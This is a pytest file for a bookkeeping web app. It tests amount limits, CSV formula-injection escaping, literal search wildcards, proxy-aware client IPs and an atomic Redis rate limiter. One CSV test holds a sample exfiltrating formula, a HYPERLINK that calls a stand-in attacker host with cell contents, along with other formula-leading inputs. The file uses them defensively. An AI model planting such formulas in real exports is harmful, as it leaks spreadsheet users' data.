"""P1 hardening: bounds, spreadsheet safety, literal search, and the rate limiter.

Each of these was a small thing that failed quietly or loudly in the wrong place:
a 30-digit amount became a 500, a description starting with `=` became a formula
in the owner's Excel, `50%` matched everything, and a crash between two Redis
commands could lock a client out forever.
"""

from __future__ import annotations

import csv
import io
import uuid
from decimal import Decimal

import pytest
from httpx import ASGITransport, AsyncClient
from starlette.requests import Request

from kasbbook.api import ratelimit
from kasbbook.api.app import create_app
from kasbbook.api.deps import client_fingerprint
from kasbbook.api.ratelimit import MemoryRateLimiter, RedisRateLimiter
from kasbbook.modules.books.models import BookType
from kasbbook.modules.books.service import BookService
from kasbbook.modules.identity.service import IdentityService
from kasbbook.modules.exchange.service import ExchangeService
from kasbbook.modules.ledger.models import Flow, Scope
from kasbbook.modules.ledger.service import LedgerService
from kasbbook.modules.reports.service import ReportService, _defang
from kasbbook.shared.errors import ValidationError
from kasbbook.shared.money import quantize
from kasbbook.shared.settings import Settings

pytestmark = pytest.mark.asyncio

SECRET = "a-test-signing-key-that-is-long-enough-to-be-real"


@pytest.fixture
async def api(db):
    settings = Settings(database_url="sqlite+aiosqlite://", api_secret_key=SECRET)
    app = create_app(settings=settings, database=db, limiter=MemoryRateLimiter())
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://test"
    ) as client:
        async with app.router.lifespan_context(app):
            yield client


async def workspace(api):
    tokens = (await api.post("/api/v1/auth/register", json={
        "display_name": "عماد", "email": "owner@example.com",
        "password": "a-good-password",
    })).json()
    headers = {"Authorization": f"Bearer {tokens['access_token']}"}
    book = (await api.post("/api/v1/books", headers=headers,
                           json={"name": "کارگاه", "type": "business",
                                 "currency": "IRT"})).json()
    return headers, book


async def setup(session):
    user = await IdentityService(session).create_user("عماد")
    book = await BookService(session).create_book(user.id, "مغازه", BookType.BUSINESS)
    return user, book


# ------------------------------------------------------- ACC-017: bounds
async def test_a_huge_amount_over_http_is_422_and_writes_nothing(api, db):
    headers, book = await workspace(api)
    url = f"/api/v1/books/{book['id']}/transactions"

    book_id = uuid.UUID(book["id"])
    async for s in db.session():
        before = await LedgerService(s).trial_balance(book_id)

    for huge in ("1" * 30, "1000000000000000000000000"):  # 10^24 exactly
        reply = await api.post(url, headers=headers, json={
            "flow": "income", "category": "فروش", "amount": huge,
        })
        assert reply.status_code == 422, (huge, reply.text)
        assert "مبلغ" in reply.json()["detail"]

    listing = (await api.get(url, headers=headers)).json()
    assert listing["total"] == 0
    async for s in db.session():
        after = await LedgerService(s).trial_balance(book_id)
    assert after == before


async def test_the_largest_amount_the_column_holds_is_accepted(api):
    headers, book = await workspace(api)
    biggest = "999999999999999999999999.9999"  # 24 digits before the point
    reply = await api.post(f"/api/v1/books/{book['id']}/transactions", headers=headers, json={
        "flow": "income", "category": "فروش", "amount": biggest,
    })
    assert reply.status_code == 201, reply.text
    assert reply.json()["original_amount"] == biggest


async def test_quantize_refuses_what_the_column_cannot_hold():
    with pytest.raises(ValidationError):
        quantize(Decimal(10) ** 24)
    with pytest.raises(ValidationError):
        quantize("999999999999999999999999.99995")  # rounds up to 10^24
    with pytest.raises(ValidationError):
        quantize(-Decimal(10) ** 24)
    with pytest.raises(ValidationError):
        quantize(Decimal("Infinity"))
    assert quantize("999999999999999999999999.9999") == Decimal("999999999999999999999999.9999")


async def test_the_ledger_refuses_a_huge_amount_with_a_domain_error(session):
    user, book = await setup(session)
    ledger = LedgerService(session)

    with pytest.raises(ValidationError):
        await ledger.record(book.id, user.id, Flow.INCOME, Scope.WORK, "فروش", 10 ** 30)

    # A rate can push an in-range amount out of range just as well.
    await ExchangeService(session).set_enabled(user.id, book.id, "USDT", True)
    with pytest.raises(ValidationError):
        await ledger.record(book.id, user.id, Flow.INCOME, Scope.WORK, "فروش",
                            Decimal("5e23"), currency="USDT",
                            conversion_rate=Decimal("1000"))

    assert await ledger.trial_balance(book.id) == (Decimal("0"), Decimal("0"))


# ------------------------------------------------- ACC-018: CSV formulas
async def test_csv_text_cells_cannot_start_a_formula(session):
    user, book = await setup(session)
    ledger = LedgerService(session)
    evil = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
    await ledger.record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "+SUM(1)", 100,
                        description=evil)
    await ledger.record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "@cmd", 200,
                        description="-2+3")
    await ledger.record(book.id, user.id, Flow.INCOME, Scope.WORK, "عادی", 300,
                        description="=1+1")
    await ledger.record(book.id, user.id, Flow.INCOME, Scope.WORK, "بدون", 400)

    payload = await ReportService(session).to_csv(book.id, user.id)
    rows = list(csv.reader(io.StringIO(payload.decode("utf-8-sig"))))[1:]
    by_category = {row[4].lstrip("'"): row for row in rows}

    first = by_category["+SUM(1)"]
    assert first[4] == "'+SUM(1)"
    assert first[9] == "'" + evil
    assert by_category["@cmd"][4] == "'@cmd"
    assert by_category["@cmd"][9] == "'-2+3"
    assert by_category["عادی"][9] == "'=1+1"
    # Ordinary text and an empty description are left exactly as they were.
    assert by_category["عادی"][4] == "عادی"
    assert by_category["بدون"][9] == ""
    # Amounts stay numbers: only text cells are defanged.
    assert [row[5] for row in rows] == ["100.0000", "200.0000", "300.0000", "400.0000"]


async def test_tab_and_carriage_return_count_as_formula_starts():
    # Excel strips them before deciding, so they are as dangerous as `=` itself.
    for lead in ("=", "+", "-", "@", "\t", "\r"):
        assert _defang(lead + "1") == "'" + lead + "1"
    assert _defang("rent") == "rent" and _defang("") == ""


async def test_a_negative_amount_column_stays_a_number(session):
    """The guard is for text cells; a leading minus in an amount is not an attack."""
    user, book = await setup(session)
    await LedgerService(session).record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "قبض", 100)
    payload = await ReportService(session).to_csv(book.id, user.id)
    rows = list(csv.reader(io.StringIO(payload.decode("utf-8-sig"))))[1:]
    for cell in (rows[0][5], rows[0][7], rows[0][8]):
        assert not cell.startswith("'")
        Decimal(cell)


async def test_the_csv_download_over_http_is_defanged_too(api):
    headers, book = await workspace(api)
    await api.post(f"/api/v1/books/{book['id']}/transactions", headers=headers, json={
        "flow": "expense", "category": "قبض", "amount": "100", "description": "=1+1",
    })
    # One row of each flow: the guard must hold for both.
    await api.post(f"/api/v1/books/{book['id']}/transactions", headers=headers, json={
        "flow": "income", "category": "فروش", "amount": "100", "description": "=1+1",
    })
    reply = await api.get(f"/api/v1/books/{book['id']}/reports/export.csv", headers=headers)
    assert reply.status_code == 200
    assert "'=1+1" in reply.content.decode("utf-8-sig")
    assert ",=1+1" not in reply.content.decode("utf-8-sig")


# ---------------------------------------------- ACC-020: literal wildcards
async def test_percent_and_underscore_in_a_search_match_literally(session):
    user, book = await setup(session)
    ledger = LedgerService(session)
    service = ReportService(session)
    await ledger.record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "تخفیف", 50,
                        description="rent 50% off")
    await ledger.record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "تخفیف", 70,
                        description="rent 500 total")
    await ledger.record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "پلان", 10,
                        description="plain")
    await ledger.record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "پلان", 20,
                        description="pl_n literal")
    await ledger.record(book.id, user.id, Flow.EXPENSE, Scope.WORK, "پلان", 30,
                        description=r"back\slash")

    rows, total, amount = await service.search(book.id, user.id, "50%")
    assert [r.description for r in rows] == ["rent 50% off"]
    assert (total, amount) == (1, Decimal("50"))

    # `%` alone, and a wildcard in the middle, match nothing that lacks them.
    assert (await service.search(book.id, user.id, "%%"))[1] == 0
    assert (await service.search(book.id, user.id, "pl%n"))[1] == 0
    rows, total, _ = await service.search(book.id, user.id, "pl_n")
    assert [r.description for r in rows] == ["pl_n literal"]
    rows, total, _ = await service.search(book.id, user.id, "k\\s")
    assert [r.description for r in rows] == [r"back\slash"]


async def test_search_stays_inside_its_own_book(session):
    user, book = await setup(session)
    other = await BookService(session).create_book(user.id, "دیگر", BookType.BUSINESS)
    await LedgerService(session).record(other.id, user.id, Flow.INCOME, Scope.WORK, "فروش", 5,
                                        description="secret 100%")
    assert (await ReportService(session).search(book.id, user.id, "100%"))[1] == 0


# ------------------------------------------------------- rate limiting
class _Clock:
    def __init__(self) -> None:
        self.now = 1_000_000.0

    def __call__(self) -> float:
        return self.now


async def test_the_memory_limiter_forgets_windows_that_have_ended(monkeypatch):
    clock = _Clock()
    monkeypatch.setattr(ratelimit.time, "time", clock)
    limiter = MemoryRateLimiter()

    for n in range(500):
        await limiter.hit(f"ip:{n}", 5, 60)
    assert len(limiter._counts) == 500

    clock.now += 3600
    await limiter.hit("ip:new", 5, 60)
    assert list(limiter._counts) == ["ip:new"]


async def test_the_memory_limiter_still_limits_and_resets(monkeypatch):
    clock = _Clock()
    monkeypatch.setattr(ratelimit.time, "time", clock)
    limiter = MemoryRateLimiter()

    results = [(await limiter.hit("k", 3, 60))[0] for _ in range(5)]
    assert results == [True, True, True, False, False]
    clock.now += 61
    assert (await limiter.hit("k", 3, 60))[0] is True


async def test_a_429_says_when_to_come_back(api):
    await api.post("/api/v1/auth/register", json={
        "display_name": "عماد", "email": "emad@example.com", "password": "a-good-password",
    })
    attempt = {"identifier": "emad@example.com", "password": "wrong"}
    replies = [await api.post("/api/v1/auth/login", json=attempt) for _ in range(8)]

    limited = [r for r in replies if r.status_code == 429]
    assert limited
    for reply in limited:
        assert 1 <= int(reply.headers["retry-after"]) <= 60
    # An ordinary refusal carries no such header.
    assert "retry-after" not in replies[0].headers


def _request(forwarded=None, peer="10.0.0.9"):
    headers = [(b"x-forwarded-for", forwarded.encode())] if forwarded else []
    return Request({"type": "http", "headers": headers, "client": (peer, 1234),
                    "method": "GET", "path": "/"})


async def test_forwarded_for_is_ignored_without_a_trusted_proxy(monkeypatch):
    monkeypatch.delenv("KASBBOOK_TRUSTED_PROXY", raising=False)
    assert client_fingerprint(_request("1.2.3.4")) == "10.0.0.9"


async def test_behind_a_proxy_the_hop_the_proxy_appended_is_the_client(monkeypatch):
    """nginx appends the real peer on the right; everything left of it is the client's claim."""
    monkeypatch.setenv("KASBBOOK_TRUSTED_PROXY", "127.0.0.1")
    spoofed = _request("6.6.6.6, 7.7.7.7, 203.0.113.5")
    assert client_fingerprint(spoofed) == "203.0.113.5"
    assert client_fingerprint(_request("203.0.113.5")) == "203.0.113.5"
    # No header at all: fall back to the direct peer.
    assert client_fingerprint(_request(None)) == "10.0.0.9"


class _FakeRedis:
    """Records commands so atomicity can be asserted without a server."""

    def __init__(self, stranded: bool = False) -> None:
        self.log: list = []
        self.count = 0
        self.ttl = -1 if stranded else 60

    def pipeline(self, transaction=True):
        outer = self
        self.log.append(("pipeline", transaction))

        class Pipe:
            def __init__(self) -> None:
                self.queued: list = []

            def set(self, key, value, nx=False, ex=None):
                self.queued.append(("set", nx, ex))
                return self

            def incr(self, key):
                self.queued.append(("incr",))
                return self

            def ttl(self, key):
                self.queued.append(("ttl",))
                return self

            async def execute(self):
                outer.log.append(("execute", tuple(self.queued)))
                outer.count += 1
                return [True, outer.count, outer.ttl]

            async def __aenter__(self):
                return self

            async def __aexit__(self, *exc):
                return False

        return Pipe()

    async def expire(self, key, seconds):
        self.log.append(("expire", seconds))
        self.ttl = seconds


async def test_the_redis_limiter_creates_the_key_with_its_ttl_in_one_transaction():
    fake = _FakeRedis()
    limiter = RedisRateLimiter(fake)

    allowed, wait = await limiter.hit("login:ip:1.2.3.4", 2, 60)

    assert allowed and wait == 60
    assert fake.log[0] == ("pipeline", True)  # MULTI/EXEC
    assert fake.log[1] == ("execute", (("set", True, 60), ("incr",), ("ttl",)))
    # Nothing outside the transaction: there is no window for a crash.
    assert len(fake.log) == 2


async def test_the_redis_limiter_counts_and_refuses_past_the_limit():
    limiter = RedisRateLimiter(_FakeRedis())
    results = [(await limiter.hit("k", 2, 60))[0] for _ in range(3)]
    assert results == [True, True, False]


async def test_a_counter_stranded_without_a_ttl_heals_instead_of_locking_out():
    """Left by the old INCR-then-EXPIRE code if the process died between them."""
    fake = _FakeRedis(stranded=True)

    allowed, wait = await RedisRateLimiter(fake).hit("k", 5, 60)

    assert ("expire", 60) in fake.log
    assert wait == 60
